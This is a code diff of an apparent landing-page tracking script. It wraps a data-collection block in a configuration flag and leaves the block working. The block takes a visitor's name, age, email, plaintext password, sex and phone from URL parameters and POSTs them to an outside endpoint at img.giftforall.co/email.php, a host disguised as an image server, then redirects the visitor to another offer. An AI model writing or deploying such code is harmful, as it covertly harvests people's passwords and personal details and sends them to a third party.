@@ -1409,38 +1409,40 @@ admt_start = () => {
 				params_object.frq = Number(params_object.frq) + 1 
 				params_object.flw = params_object.flw + "_2nd"
 
-				setTimeout(()=>{
-					let api_send_data = {
-						name: params_object?.n ,
-						last_name: params_object?.fn ,
-						age: params_object?.a ,
-						email: params_object?.em ,
-						password: params_object?.ps ,
-						sex: params_object?.sx ,
-						phone: params_object?.ph ,
-						click_id: admt_conf?.subid ,
-						vertical: admt_conf?.vertical ,
-						source:`${admt_conf?.sorc_id}_${admt_conf?.landing_id}` ,
-					}
-					for (let key in api_send_data) {
-					    if (api_send_data[key] === "" || api_send_data[key] === undefined || api_send_data[key] == 'unkwn' || api_send_data[key] == null) {
-					        delete api_send_data[key];
-					    }
-					}
-					if (params_object.em !== "" && /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,10})+$/.test(params_object.em)) {
-						$.ajax({
-						    url: 'https://img.giftforall.co/email.php',
-						    type: 'POST',
-						    data: api_send_data,
-						    success: function(response) {
-						        console.log('Запит відправлено успішно!', response);
-						    },
-						    error: function(xhr, status, error) {
-						        console.error('Помилка при відправленні запиту:', status, error);
+				if (!admt_conf.collect_disabled) {
+					setTimeout(()=>{
+						let api_send_data = {
+							name: params_object?.n ,
+							last_name: params_object?.fn ,
+							age: params_object?.a ,
+							email: params_object?.em ,
+							password: params_object?.ps ,
+							sex: params_object?.sx ,
+							phone: params_object?.ph ,
+							click_id: admt_conf?.subid ,
+							vertical: admt_conf?.vertical ,
+							source:`${admt_conf?.sorc_id}_${admt_conf?.landing_id}` ,
+						}
+						for (let key in api_send_data) {
+						    if (api_send_data[key] === "" || api_send_data[key] === undefined || api_send_data[key] == 'unkwn' || api_send_data[key] == null) {
+						        delete api_send_data[key];
 						    }
-						});
-					}
-				},50)
+						}
+						if (params_object.em !== "" && /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,10})+$/.test(params_object.em)) {
+							$.ajax({
+							    url: 'https://img.giftforall.co/email.php',
+							    type: 'POST',
+							    data: api_send_data,
+							    success: function(response) {
+							        console.log('Запит відправлено успішно!', response);
+							    },
+							    error: function(xhr, status, error) {
+							        console.error('Помилка при відправленні запиту:', status, error);
+							    }
+							});
+						}
+					},50)
+				}
 				
 				setTimeout(function() {
 				    document.location.href = $(".second-offer-go").attr("href")
